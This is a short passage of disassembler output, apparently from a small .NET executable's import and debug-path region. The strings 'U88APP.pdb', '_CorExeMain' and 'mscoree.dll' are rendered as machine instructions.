  4080a1:	55                   	push   %ebp
  4080a2:	38 38                	cmp    %bh,(%eax)
  4080a4:	41                   	inc    %ecx
  4080a5:	50                   	push   %eax
  4080a6:	50                   	push   %eax
  4080a7:	2e 70 64             	jo,pn  0x40810e
  4080aa:	62 00                	bound  %eax,(%eax)
  4080ac:	d4 80                	aam    $0x80
	...
  4080b6:	00 00                	add    %al,(%eax)
  4080b8:	ee                   	out    %al,(%dx)
  4080b9:	80 00 00             	addb   $0x0,(%eax)
  4080bc:	00 20                	add    %ah,(%eax)
	...
  4080d2:	00 00                	add    %al,(%eax)
  4080d4:	e0 80                	loopne 0x408056
	...
  4080e2:	5f                   	pop    %edi
  4080e3:	43                   	inc    %ebx
  4080e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4080e5:	72 45                	jb     0x40812c
  4080e7:	78 65                	js     0x40814e
  4080e9:	4d                   	dec    %ebp
  4080ea:	61                   	popa
  4080eb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  4080f2:	72 65                	jb     0x408159
  4080f4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  4080f8:	6c                   	insb   (%dx),%es:(%edi)
  4080f9:	00 00                	add    %al,(%eax)
  4080fb:	00 00                	add    %al,(%eax)
  4080fd:	00 ff                	add    %bh,%bh
  4080ff:	25 00 20 40 00       	and    $0x402000,%eax
  408104:	00 00                	add    %al,(%eax)
  408106:	00 00                	add    %al,(%eax)
  408108:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  40810d:	cd 97                	int    $0x97
  40810f:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  408115:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408116:	78 43                	js     0x40815b
  408118:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  40811e:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  408124:	e6 c3                	out    %al,$0xc3
  408126:	39                   	.byte 0x39
  408127:	41                   	inc    %ecx
